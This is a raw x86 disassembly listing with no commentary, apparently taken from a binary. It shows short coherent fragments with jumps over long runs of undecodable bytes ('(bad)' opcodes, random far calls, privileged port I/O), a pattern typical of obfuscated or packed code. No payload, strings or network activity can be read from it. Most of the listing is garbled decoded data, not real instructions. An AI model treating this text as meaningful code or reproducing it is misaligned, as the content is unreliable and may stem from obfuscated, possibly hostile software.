  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0x2baae783
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403a75
  403a5b:	inc    ebp
  403a5c:	add    al,0x21
  403a5e:	adc    al,dl
  403a60:	add    DWORD PTR [edx-0x59],ebx
  403a63:	lods   eax,DWORD PTR ds:[esi]
  403a64:	ja     0x403a18
  403a66:	xor    DWORD PTR [ebx-0xaad613e],edi
  403a6c:	pusha  
  403a6d:	push   ss
  403a6e:	sbb    eax,0x524738e9
  403a73:	add    BYTE PTR ds:0x66d09983,0x53
  403a7a:	mov    esp,0x54df1445
  403a7f:	mov    DWORD PTR [edx-0xcfd8467],ebp
  403a85:	mov    dl,0xf1
  403a87:	out    0xca,al
  403a89:	loopne 0x403a29
  403a8b:	data16 mov ds:0xa000ad81,al
  403a91:	or     BYTE PTR [edx],0x8b
  403a94:	sub    BYTE PTR ds:0xa72253ae,0x80
  403a9b:	add    edx,eax
  403a9d:	lock mov bl,0xd6
  403aa0:	ret    0x2617
  403aa3:	loopne 0x403ae1
  403aa5:	cdq    
  403aa6:	outs   dx,DWORD PTR ds:[esi]
  403aa7:	(bad)  
  403aa8:	mov    ebp,0x9f67d30
  403aad:	or     al,0x77
  403aaf:	cli    
  403ab0:	mov    edi,0x16865fb1
  403ab5:	sbb    bh,al
  403ab7:	and    dh,BYTE PTR [edx+0x74e370eb]
  403abd:	popa   
  403abe:	sbb    bh,bh
  403ac0:	dec    edi
  403ac1:	je     0x403b30
  403ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ac4:	pop    es
  403ac5:	sbb    eax,0xfab0c369
  403aca:	mov    eax,0x6a66906a
  403acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ad0:	pushf  
  403ad1:	sti    
  403ad2:	and    eax,0x86e41a4f
  403ad7:	test   eax,0xf1c527dd
  403adc:	(bad)  
  403add:	mov    ebp,0x7ad4bb7c
  403ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ae3:	fs scas eax,DWORD PTR es:[edi]
  403ae5:	test   BYTE PTR [ebp+0x67eb2280],bh
  403aeb:	outs   dx,BYTE PTR ds:[esi]
  403aec:	dec    ebp
  403aed:	jl     0x403ae8
  403aef:	sti    
  403af0:	les    ebp,FWORD PTR [edx-0x707b65e1]
  403af6:	dec    edi
  403af7:	into   
  403af8:	test   DWORD PTR [ebx+0x6bd4701b],ecx
  403afe:	cdq    
  403aff:	(bad)  
  403b00:	(bad)  
  403b02:	retf   0x212f
  403b05:	in     al,0xf1
  403b07:	test   BYTE PTR [ebx],bh
  403b09:	and    al,0xd1
  403b0b:	adc    al,BYTE PTR ds:0x41bcf593
  403b11:	aas    
  403b12:	adc    al,0x1c
  403b14:	add    eax,0xdc9a37d3
  403b19:	leave  
  403b1a:	(bad)  
  403b1c:	fwait
  403b1d:	lock push 0x8a3bb93e
  403b23:	cmp    edx,DWORD PTR [ebp-0x7bc2b225]
  403b29:	jns    0x403b03
  403b2b:	mov    cl,0xfb
  403b2d:	push   cs
  403b2e:	jnp    0x403b30
  403b30:	imul   esp,DWORD PTR [esi],0xa3bb3718
  403b36:	(bad)  
  403b37:	in     al,dx
  403b38:	or     al,0x86
  403b3a:	adc    bl,BYTE PTR [edi-0x25]
  403b3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b3e:	(bad)  
  403b3f:	or     eax,0x13e30b7a
  403b44:	inc    ebx
  403b45:	and    eax,0xaf90d056
  403b4a:	or     cl,ch
  403b4c:	cmpps  xmm6,XMMWORD PTR ds:0x84dc6b11,0x6c
  403b54:	arpl   cx,bx
  403b56:	dec    esp
  403b57:	aad    0x87
  403b59:	jns    0x403b6c
  403b5b:	jns    0x403bd3
  403b5d:	jl     0x403b62
  403b5f:	xchg   edx,eax
  403b60:	sub    cl,BYTE PTR [eax+0x33ec8caf]
  403b66:	aaa    
  403b67:	sub    eax,0x9304b6c4
  403b6c:	jae    0x403bc2
  403b6e:	sub    DWORD PTR [ecx-0x376b1084],esi
  403b74:	dec    ebp
  403b75:	pop    eax
  403b76:	mov    edi,DWORD PTR [edx+0x15]
  403b79:	ds adc al,0x9d
  403b7c:	mov    al,0x9f
  403b7e:	push   es
  403b7f:	push   cs
  403b80:	mov    dl,0x5a
  403b82:	sti    
  403b83:	clc    
  403b84:	(bad)  
  403b85:	dec    esp
  403b86:	or     eax,0x54a3e309
  403b8b:	pop    edx
  403b8c:	rcr    DWORD PTR [eax-0xfc069d6],cl
  403b92:	inc    eax
  403b93:	inc    edx
  403b94:	pushf  
  403b95:	call   0xa30:0x240f8f1f
  403b9c:	pop    esi
  403b9d:	sbb    eax,0xa9e1767a
  403ba2:	inc    edx
  403ba3:	or     al,0x8a
  403ba5:	stos   DWORD PTR es:[edi],eax
  403ba6:	bound  ecx,QWORD PTR [ebp+0x65]
  403ba9:	in     eax,dx
  403baa:	and    al,0x3c
  403bac:	in     eax,dx
  403bad:	cdq    
  403bae:	pop    ds
  403baf:	test   al,0xd
  403bb1:	sub    BYTE PTR [edi+0x57],bl
  403bb4:	jecxz  0x403b4b
  403bb6:	mov    dl,0x61
  403bb8:	jb     0x403b65
  403bba:	shl    ch,1
  403bbc:	mov    dl,0x10
  403bbe:	repnz xor al,0x4
  403bc1:	dec    edi
  403bc2:	jl     0x403bed
  403bc4:	out    dx,eax
  403bc5:	fmul   DWORD PTR [edi+0x30]
  403bc8:	ins    DWORD PTR es:[edi],dx
  403bc9:	out    dx,eax
  403bca:	aad    0x33
  403bcc:	in     eax,dx
  403bcd:	xchg   ebp,eax
  403bce:	bnd je 0x403ba6
  403bd1:	xchg   edi,eax
  403bd2:	enter  0xaeb6,0xb8
  403bd6:	shl    BYTE PTR [ebp+0x6d1ae330],cl
  403bdc:	imul   ebp,DWORD PTR [eax-0x71dcc02a],0xffffff82
  403be3:	jge    0x403c2b
  403be5:	fnsave [edi-0x5a]
  403be8:	pop    edx
  403be9:	mov    bh,BYTE PTR [eax]
  403beb:	cld    
  403bec:	daa    
  403bed:	fwait
  403bee:	stos   BYTE PTR es:[edi],al
  403bef:	das    
  403bf0:	shr    bh,0xb5
  403bf3:	adc    eax,0x42e4909d
  403bf8:	and    al,0x5e
  403bfa:	add    al,0x3b
  403bfc:	inc    edx
  403bfd:	jp     0x403c4f
  403bff:	lea    edx,[ebx]
  403c01:	jge    0x403c13
  403c03:	jo     0x403c65
  403c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c06:	pop    ss
  403c07:	fstp   st(0)
  403c09:	sti    
  403c0a:	je     0x4041a7
  403c10:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0x77dcf48b
  403c29:	data16 int 0x4
  403c2c:	inc    edx
  403c2d:	push   ds
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403c73
  403c35:	adc    ch,ah
  403c37:	mov    WORD PTR [eax],?
  403c39:	(bad)  
  403c3a:	fidiv  WORD PTR [ecx-0x6d]
  403c3d:	mov    ebp,0x847fdddd
  403c42:	js     0x403c72
  403c44:	rcl    DWORD PTR [edi],0xaf
  403c47:	or     eax,0xd9c0d6cc
  403c4c:	pop    eax
  403c4d:	push   ebp
  403c4e:	sahf   
  403c4f:	outs   dx,DWORD PTR ds:[esi]
  403c50:	mov    es,ebp
  403c52:	sub    bh,0x3f
  403c55:	dec    esi
  403c56:	loopne 0x403c09
  403c58:	into   
  403c59:	lahf   
  403c5a:	cmp    BYTE PTR [ebx],bl
  403c5c:	dec    edi
  403c5d:	jne    0x403ca0
  403c5f:	ret    
  403c60:	outs   dx,BYTE PTR ds:[esi]
  403c61:	xlat   BYTE PTR ds:[ebx]
  403c62:	imul   esp,esi,0x2ea48480
  403c68:	dec    esi
  403c69:	jp     0x403c38
  403c6b:	pushf  
  403c6c:	inc    eax
  403c6d:	pop    eax
  403c6e:	cdq    
  403c6f:	shr    BYTE PTR [esi],cl
  403c71:	pop    ebx
  403c72:	xchg   esp,eax
  403c73:	out    0x33,al
  403c75:	sbb    DWORD PTR [edx+0x3],edi
  403c78:	push   0xffffffef
  403c7a:	fisttp WORD PTR [edx+0x3ab2cabf]
  403c80:	bound  ebx,QWORD PTR [esi+eiz*4+0x1842c519]
  403c87:	shl    DWORD PTR [ecx-0x6e2ab67c],cl
  403c8d:	fxch   st(2)
  403c8f:	test   ch,al
  403c91:	pop    edi
  403c92:	retf   0xe86a
  403c95:	jmp    0x102:0x9ef52165
  403c9c:	stc    
  403c9d:	pop    ebp
  403c9e:	aad    0x80
  403ca0:	mov    al,0x6c
  403ca2:	xor    bh,dl
  403ca4:	push   ss
  403ca5:	lods   al,BYTE PTR ds:[esi]
  403ca6:	aad    0x7f
  403ca8:	lea    ecx,[ebx-0x20db4ba3]
  403cae:	je     0x403c4a
  403cb0:	out    dx,eax
  403cb1:	sub    al,0x58
  403cb3:	loopne 0x403ccb
  403cb5:	sub    eax,0xfe90e31a
  403cba:	outs   dx,BYTE PTR ds:[esi]
  403cbb:	fisttp WORD PTR [ebp+eax*2-0x4dcbc527]
  403cc2:	fmul   DWORD PTR [ebx]
  403cc4:	stc    
  403cc5:	push   edi
  403cc6:	xchg   esp,eax
  403cc7:	std    
  403cc8:	fdiv   QWORD PTR [ebx-0x4fcac36b]
  403cce:	call   0x928b175e
  403cd3:	mov    ch,0xba
  403cd5:	call   0xae799332
  403cda:	push   cs
  403cdb:	aad    0xd5
  403cdd:	jnp    0x403c78
  403cdf:	leave  
  403ce0:	push   cs
  403ce1:	sbb    edx,DWORD PTR [edi+0x4]
  403ce4:	add    DWORD PTR cs:[esi],edx
  403ce7:	mov    ?,esp
  403ce9:	jb     0x403d04
  403ceb:	loopne 0x403cde
  403ced:	push   ebx
  403cee:	fidiv  DWORD PTR [ecx-0x74]
  403cf1:	pop    esp
  403cf2:	jmp    0x8b0ac757
  403cf7:	daa    
  403cf8:	mov    edx,?
  403cfa:	cli    
  403cfb:	sbb    dl,al
  403cfd:	jne    0x403d75
  403cff:	jno    0x403d72
  403d01:	ins    DWORD PTR es:[edi],dx
  403d02:	pushf  
  403d03:	es fsubrp st(7),st
  403d06:	imul   esp,DWORD PTR ss:0xdb138722,0xd86820fa
  403d11:	jno    0x403d23
  403d13:	cli    
  403d14:	pop    edi
  403d15:	push   ss
  403d16:	aaa    
  403d17:	in     eax,dx
  403d18:	cmp    ecx,DWORD PTR [edx-0x80]
  403d1b:	pop    ebx
  403d1c:	ins    DWORD PTR es:[edi],dx
  403d1d:	mov    cl,0x98
  403d1f:	clc    
  403d20:	sub    eax,0x23b81d97
  403d25:	sbb    DWORD PTR [edi],ecx
  403d27:	push   ecx
  403d28:	pop    esp
  403d29:	and    BYTE PTR ds:0x142da13b,ah
  403d2f:	add    eax,0x2d383c0f
  403d34:	lods   al,BYTE PTR ds:[esi]
  403d35:	ss xchg edi,eax
  403d37:	aad    0x6f
  403d39:	mov    ah,0x7d
  403d3b:	out    dx,al
  403d3c:	push   esp
  403d3d:	retf   0x45b9
  403d40:	dec    ebx
  403d41:	aam    0x5e
  403d43:	cmp    DWORD PTR [ecx],ebp
  403d45:	adc    DWORD PTR [ecx],edi
  403d47:	jmp    FWORD PTR [edi-0x4d]
  403d4a:	inc    ebx
  403d4b:	mov    al,BYTE PTR [edx]
  403d4d:	cli    
  403d4e:	cmp    DWORD PTR [edx],0xfffffff2
  403d51:	mov    ebp,ebx
  403d53:	ret    
  403d54:	mov    edx,0x9f96e1a9
  403d59:	loop   0x403db4
  403d5b:	test   edi,ebp
  403d5d:	xchg   DWORD PTR [edi-0x38],esp
  403d60:	push   esi
  403d61:	sub    eax,DWORD PTR [edx+0x752cc4d0]
  403d67:	ffreep st(4)
  403d69:	xor    BYTE PTR [ebx],dh
  403d6b:	sub    DWORD PTR [ecx],ecx
  403d6d:	les    esp,FWORD PTR [ebp+0x6f5f0980]
  403d73:	clc    
  403d74:	pop    eax
  403d75:	in     al,0x1e
  403d77:	xor    dl,BYTE PTR [ecx-0x15944fa3]
  403d7d:	jg     0x403d59
  403d7f:	xchg   ecx,eax
  403d80:	xchg   ebp,eax
  403d81:	jl     0x403d2e
  403d83:	lahf   
  403d84:	push   0x77d6e1d6
  403d89:	fcmove st,st(6)
  403d8b:	aas    
  403d8c:	mov    eax,0xc67eba0d
  403d91:	add    esp,DWORD PTR [ebx+edi*2]
  403d94:	lods   al,BYTE PTR ds:[esi]
  403d95:	ins    DWORD PTR es:[edi],dx
  403d96:	(bad)  
  403d97:	mov    ds:0x25a9d86c,eax
  403d9c:	mov    eax,0xd71b6861
  403da1:	dec    eax
  403da2:	mov    ds:0x831b2b95,eax
  403da7:	inc    esi
  403da8:	add    BYTE PTR [ebp-0x79fd8671],cl
  403dae:	scas   eax,DWORD PTR es:[edi]
  403daf:	add    BYTE PTR [edx+0x42f379dc],ah
  403db5:	xchg   edx,eax
  403db6:	dec    edi
  403db7:	or     BYTE PTR [eax],0x86
  403dba:	in     eax,0x45
  403dbc:	xchg   al,ch
  403dbe:	je     0x403da6
  403dc0:	sbb    cl,dl
  403dc2:	retf   
  403dc3:	mov    ds:0x11b7d325,eax
  403dc8:	ret    0xfdc7
  403dcb:	in     al,0x63
  403dcd:	out    0x85,eax
  403dcf:	aam    0x27
  403dd1:	jl     0x403e0c
  403dd3:	jg     0x403e19
  403dd5:	lock add BYTE PTR [ecx-0x33b36b72],bh
  403ddc:	push   eax
  403ddd:	in     al,dx
  403dde:	(bad)  
  403ddf:	pusha  
  403de0:	mov    ebp,0x8d119699
  403de5:	inc    ebp
  403de6:	call   0x8c2c8374
  403deb:	inc    ebp
  403dec:	in     al,dx
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi+0x5ca5cb5f],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403e4f
  403e11:	je     0x403de1
  403e13:	sbb    esi,0xc9c07074
  403e19:	loop   0x403dff
  403e1b:	sub    esi,DWORD PTR [esi-0x29b616a]
  403e21:	and    ebp,eax
  403e23:	sbb    dh,BYTE PTR ds:0xd0243f90
  403e29:	retf   0xea12
  403e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e2d:	pop    es
  403e2e:	das    
  403e2f:	inc    edx
  403e30:	or     BYTE PTR [edx+0x51],al
  403e33:	cdq    
  403e34:	dec    ebp
  403e35:	rol    DWORD PTR [ebx-0x7f],0x34
  403e39:	clc    
  403e3a:	(bad)  
  403e3c:	neg    BYTE PTR [eax]
  403e3e:	jp     0x403e11
  403e40:	jo     0x403e38
  403e42:	aaa    
  403e43:	or     ebx,DWORD PTR [esi-0x5938cce1]
  403e49:	ret    0x1841
  403e4c:	xchg   esp,eax
  403e4d:	pop    ebp
  403e4e:	inc    ebp
  403e4f:	sub    eax,0x6e21432e
  403e54:	sahf   
  403e55:	dec    dh
  403e57:	ret    0xe733
  403e5a:	not    DWORD PTR [edx-0x31739710]
  403e60:	div    BYTE PTR [ebx]
  403e62:	repz jbe 0x403e9f
  403e65:	retf   0xf7eb
  403e68:	adc    DWORD PTR [esi+0x197f9222],esi
  403e6e:	pop    es
  403e6f:	fdiv   DWORD PTR [ecx+0x14a69648]
  403e75:	mov    esp,0xacd1faca
  403e7a:	pop    es
  403e7b:	push   ebx
  403e7c:	mov    es,ebp
  403e7e:	xchg   esp,eax
  403e7f:	mov    eax,ds:0x64a45a66
  403e84:	inc    ebx
  403e85:	loope  0x403e0a
  403e87:	inc    ecx
  403e88:	leave  
  403e89:	adc    esi,DWORD PTR [eax+0x43b7f317]
  403e8f:	jp     0x403e11
  403e91:	pop    esi
  403e92:	out    0xf5,eax
  403e94:	add    BYTE PTR [ecx],ch
  403e96:	scas   eax,DWORD PTR es:[edi]
  403e97:	sub    ebx,DWORD PTR [ecx-0x656c8362]
  403e9d:	cmp    al,0x77
  403e9f:	aam    0x1b
  403ea1:	lock fsub st,st(3)
  403ea4:	std    
  403ea5:	push   ss
  403ea6:	sbb    BYTE PTR [esi-0x7bf83891],cl
  403eac:	mov    BYTE PTR [ebx+0x7444873b],ch
  403eb2:	(bad)  
  403eb3:	in     eax,dx
  403eb4:	inc    ebx
  403eb5:	inc    eax
  403eb6:	stos   DWORD PTR es:[edi],eax
  403eb7:	addr16 daa 
  403eb9:	mov    ?,WORD PTR [ebx+0x18]
  403ebc:	ins    DWORD PTR es:[edi],dx
  403ebd:	outs   dx,BYTE PTR ds:[esi]
  403ebe:	sub    DWORD PTR [ecx+0x44],ecx
  403ec1:	pop    ebx
  403ec2:	dec    edx
  403ec3:	test   eax,eax
  403ec5:	jne    0x403ecb
  403ec7:	push   ss
  403ec8:	in     al,dx
  403ec9:	fwait
  403eca:	aas    
  403ecb:	and    eax,0x60e6dfd8
  403ed0:	test   DWORD PTR [edx+eiz*1],edi
  403ed3:	mov    ah,0xa8
  403ed5:	idiv   DWORD PTR [edx+eax*8]
  403ed8:	rcr    DWORD PTR [ebx-0x2f7a7405],0x85
  403edf:	xchg   ecx,eax
  403ee0:	push   ebp
  403ee1:	aad    0xdf
  403ee3:	(bad)  
  403ee5:	mov    esi,0x3172ad88
  403eea:	pop    ebx
  403eeb:	cdq    
  403eec:	inc    ebx
  403eed:	loop   0x403eec
  403eef:	into   
  403ef0:	int3   
  403ef1:	aas    
  403ef2:	mov    edi,0x99956440
  403ef7:	scas   eax,DWORD PTR es:[edi]
  403ef8:	fucomip st,st(4)
  403efa:	prefetch (bad)
  403efb:	or     eax,0x584a13c6
  403f00:	call   0x22f0:0x3fee89fd
  403f07:	out    0xe0,al
  403f09:	in     eax,dx
  403f0a:	jnp    0x403ed0
  403f0c:	pop    esp
  403f0d:	push   ds
  403f0e:	pop    ss
  403f0f:	dec    ebx
  403f10:	or     BYTE PTR [eax],ch
  403f12:	add    bl,BYTE PTR [ebx-0x3e]
  403f15:	jb     0x403eb1
  403f17:	cld    
  403f18:	pmaxub mm0,QWORD PTR [edi-0x80]
  403f1c:	in     al,dx
  403f1d:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  403f1f:	cdq    
  403f20:	dec    esp
  403f21:	cld    
  403f22:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f24:	ss mov bl,0x32
  403f27:	xor    BYTE PTR [edx+0x5f],ah
  403f2a:	cmp    edx,DWORD PTR [esi]
  403f2c:	push   es
  403f2d:	inc    ebx
  403f2e:	les    ecx,FWORD PTR [esi-0x5d]
  403f31:	in     al,dx
  403f32:	test   eax,0x81d255ee
  403f37:	sti    
  403f38:	sbb    bl,al
  403f3a:	rol    DWORD PTR [ecx-0x6fd13f59],0x5b
  403f41:	scas   al,BYTE PTR es:[edi]
  403f42:	mov    cl,0x68
  403f44:	pusha  
  403f45:	push   ecx
  403f46:	pop    ecx
  403f47:	lods   eax,DWORD PTR ds:[esi]
  403f48:	cld    
  403f49:	bound  ebx,QWORD PTR [ebp-0x6ed70948]
  403f4f:	scas   al,BYTE PTR es:[edi]
  403f50:	ret    0x34a7
  403f53:	mov    al,ds:0x3978d166
  403f58:	nop
  403f59:	pop    ds
  403f5a:	push   0x18b799df
  403f5f:	fldenv [edx+ecx*1]
  403f62:	mov    al,0x4
  403f64:	push   esp
  403f65:	int    0x6a
  403f67:	and    BYTE PTR [ecx-0x46],bl
  403f6a:	inc    edx
  403f6b:	ss xor al,0x12
  403f6e:	inc    esi
  403f6f:	jmp    0x403fc0
  403f71:	sbb    ebx,DWORD PTR [ecx]
  403f73:	mov    eax,ds:0xe304db72
  403f78:	pop    ebx
  403f79:	fwait
  403f7a:	xchg   ebp,eax
  403f7b:	std    
  403f7c:	aad    0xf8
  403f7e:	xchg   edi,eax
  403f7f:	and    eax,0x375707a6
  403f84:	push   esi
  403f85:	push   edi
  403f86:	push   esi
  403f87:	xchg   ecx,eax
  403f88:	cdq    
  403f89:	mov    ch,0xf1
  403f8b:	push   ecx
  403f8c:	loop   0x403fa6
  403f8e:	(bad)  
  403f8f:	pop    esi
  403f90:	adc    DWORD PTR [ebx],0x49bcd15b
  403f96:	or     eax,0x2672fa97
  403f9b:	adc    bl,BYTE PTR [eax]
  403f9d:	in     al,dx
  403f9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f9f:	icebp  
  403fa0:	or     dl,BYTE PTR [ebp+0x10fba10]
  403fa6:	dec    edx
  403fa7:	cld    
  403fa8:	jns    0x403f60
  403faa:	in     al,dx
  403fab:	jb     0x403fe3
  403fad:	scas   eax,DWORD PTR es:[edi]
  403fae:	retf   
  403faf:	add    eax,0x11fb5b8d
  403fb4:	es push eax
  403fb6:	stc    
  403fb7:	stc    
  403fb8:	inc    ebp
  403fb9:	mov    edx,0x37bb7151
  403fbe:	mov    ecx,ss
  403fc0:	mov    eax,DWORD PTR [ebp-0x10]
  403fc3:	mov    edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	loope  0x40404e
  403fdb:	imul   edx,DWORD PTR ds:0x7e7e1a22,0x7e7e7fae
  403fe5:	popa   
  403fe6:	mov    ds:0xad9c895a,eax
  403feb:	or     DWORD PTR gs:[ebx],esi
  403fee:	arpl   WORD PTR [ecx-0x38],ax
  403ff1:	rcr    BYTE PTR [ebx],1
  403ff3:	fwait
  403ff4:	sub    ah,BYTE PTR [ecx-0x31]
  403ff7:	or     eax,DWORD PTR [edx-0x64d84648]
  403ffd:	xor    ah,0xd5
  404000:	push   eax
  404001:	lsl    edi,WORD PTR [edx-0xf]
  404005:	mov    edi,0xefc0590d
  40400a:	cmp    edx,eax
  40400c:	or     bh,ah
  40400e:	mov    bh,0x8d
  404010:	out    0x88,al
  404012:	xor    eax,0x9265596
  404017:	jo     0x404032
  404019:	fisub  WORD PTR [edx]
  40401b:	fild   DWORD PTR [edx-0x6d]
  40401e:	js     0x403fe6
  404020:	or     al,BYTE PTR [edi+0x4f913b14]
  404026:	mov    ebx,0xf04aa3e4
  40402b:	loop   0x403ff5
  40402d:	retf   0x9901
  404030:	xchg   DWORD PTR [ebx+0x4e],ebx
  404033:	xchg   edi,eax
  404034:	xor    ecx,edi
  404036:	sbb    al,0xc5
  404038:	pop    eax
  404039:	xor    DWORD PTR [eax+edx*4-0x50d3f25c],0xc03529d2
  404044:	aad    0x59
  404046:	push   bp
  404048:	pop    ds
  404049:	mov    ds:0x9cd4bddb,al
  40404e:	xor    bl,BYTE PTR [ebx-0x73]
  404051:	fst    DWORD PTR [esi-0x2f16be43]
  404057:	fistp  WORD PTR [ebp+0x53]
  40405a:	arpl   ax,di
  40405c:	jle    0x403ff0
  40405e:	std    
  40405f:	push   eax
  404060:	xor    ebx,edi
  404062:	aad    0x36
  404064:	inc    esp
  404065:	dec    ecx
  404066:	xchg   ecx,eax
  404067:	push   edi
  404068:	data16 shl bh,cl
  40406b:	sbb    eax,0x5f1a9af1
  404070:	mov    ah,0xe9
  404072:	scas   eax,DWORD PTR es:[edi]
  404073:	mov    al,0xe9
  404075:	scas   eax,DWORD PTR es:[edi]
  404076:	xor    BYTE PTR [si+0x3f],al
  40407a:	out    0xef,eax
  40407c:	outs   dx,BYTE PTR ds:[esi]
  40407d:	xchg   DWORD PTR [edx+0x18],esp
  404080:	jmp    0x4040aa
  404082:	fdivr  DWORD PTR [edi-0x6552790b]
  404088:	pop    ss
  404089:	add    BYTE PTR [ecx+esi*8-0x2c],ch
  40408d:	mov    dl,0x30
  40408f:	pusha  
  404090:	test   BYTE PTR [edi-0x11959abf],bl
  404096:	or     ebx,edx
  404098:	pop    edx
  404099:	mov    al,0x41
  40409b:	in     eax,dx
  40409c:	jno    0x404094
  40409e:	sub    DWORD PTR [esi-0x4c84a6e1],ebp
  4040a4:	ins    DWORD PTR es:[edi],dx
  4040a5:	xchg   edi,eax
  4040a6:	xchg   esp,eax
  4040a7:	cmp    BYTE PTR [esi+edx*8+0x66c43acd],ah
  4040ae:	sub    eax,0xd284e89d
  4040b3:	dec    esi
  4040b4:	xchg   ebx,eax
  4040b5:	mov    WORD PTR [edi],ds
  4040b7:	xchg   esp,eax
  4040b8:	mov    bh,0x1a
  4040ba:	loopne 0x404130
  4040bc:	hlt    
  4040bd:	adc    eax,0x9b285def
  4040c2:	lock out 0xed,eax
  4040c5:	mov    bl,BYTE PTR [edx-0x457d4f9a]
  4040cb:	dec    esi
  4040cc:	xchg   BYTE PTR [edi-0x56],dl
  4040cf:	in     al,0xf
  4040d1:	test   BYTE PTR [edx],0x1f
  4040d4:	retf   
  4040d5:	add    eax,0xf525ed9b
  4040da:	retf   0xd4b
  4040dd:	adc    dl,BYTE PTR [ebp-0x21]
  4040e0:	xor    al,0x55
  4040e2:	pusha  
  4040e3:	push   ebp
  4040e4:	jge    0x4040b4
  4040e6:	jno    0x4040f7
  4040e8:	mov    eax,0x9268b036
  4040ed:	mov    dh,cl
  4040ef:	mov    edi,0xa0f51e22
  4040f4:	push   edi
  4040f5:	out    0xd0,al
  4040f7:	adc    eax,0x982e543
  4040fc:	inc    esi
  4040fd:	xchg   ecx,eax
  4040fe:	punpcklbw mm4,DWORD PTR [edi-0x74]
  404102:	adc    eax,0x176f94ab
  404107:	clc    
  404108:	retf   
  404109:	mov    eax,0x997f6a39
  40410e:	jmp    0x40416d
  404110:	and    cl,BYTE PTR [ebx]
  404112:	int3   
  404113:	in     eax,dx
  404114:	sub    eax,0xa03c6452
  404119:	enter  0xab48,0xca
  40411d:	inc    edi
  40411e:	inc    eax
  40411f:	sub    al,cl
  404121:	cmp    al,0xef
  404123:	into   
  404124:	out    dx,al
  404125:	cmp    al,0x2
  404127:	pop    eax
  404128:	and    al,0x11
  40412a:	sub    ebp,eax
  40412c:	inc    esi
  40412d:	jmp    0x4040c1
  40412f:	push   ds
  404130:	loope  0x40411c
  404132:	and    bl,BYTE PTR [ebp-0x1]
  404135:	pop    ss
  404136:	ror    DWORD PTR [edx+0xf],1
  404139:	js     0x404193
  40413b:	into   
  40413c:	adc    bl,al
  40413e:	xchg   esp,eax
  40413f:	aad    0x7e
  404141:	ins    BYTE PTR es:[edi],dx
  404142:	and    eax,0xf563318f
  404147:	lock aas 
  404149:	js     0x404114
  40414b:	not    ah
  40414d:	mov    ebx,0x7f900d3e
  404152:	jo     0x4040e8
  404154:	push   eax
  404155:	ins    BYTE PTR es:[edi],dx
  404156:	into   
  404157:	fsub   DWORD PTR [edx+0x48]
  40415a:	xor    ah,BYTE PTR [eax-0x6f408860]
  404160:	(bad)  
  404161:	cmc    
  404162:	or     eax,0x96f4d5f6
  404167:	jns    0x404108
  404169:	and    eax,0x2f80177b
  40416e:	test   DWORD PTR [ecx-0xafe122e],esi
  404174:	push   0x74b3db9c
  404179:	cmp    eax,0x914e9734
  40417e:	pop    ebp
  40417f:	add    BYTE PTR [ebp-0x6c],ch
  404182:	mov    ax,ds:0x3fedcfc9
  404188:	div    BYTE PTR [edi]
  40418a:	popa   
  40418b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40418c:	mov    ebp,0x433ae124
  404191:	fisttp QWORD PTR [esp+ebx*8+0x10848dfb]
  404198:	fwait
  404199:	jb     0x4041cd
  40419b:	add    BYTE PTR [ecx+0x45ff0845],cl
  4041a1:	or     al,0xe9
  4041a3:	arpl   ax,di
  4041a5:	(bad)  
  4041a6:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	push   cs
  4041d6:	cli    
  4041d7:	mov    ds:0x7e1b520d,eax
  4041dc:	jle    0x404177
  4041de:	jg     0x40425e
  4041e0:	jle    0x4041a1
  4041e2:	sbb    DWORD PTR [esi+0x27],esi
  4041e5:	cmp    al,0xfe
  4041e7:	adc    ebx,0x953e5fbc
  4041ed:	enter  0xa9,0x28
  4041f1:	cmp    eax,0xd24ebb89
  4041f6:	popa   
  4041f7:	rcr    DWORD PTR [esp+ebx*8+0x689df28c],1
  4041fe:	xchg   cl,ch
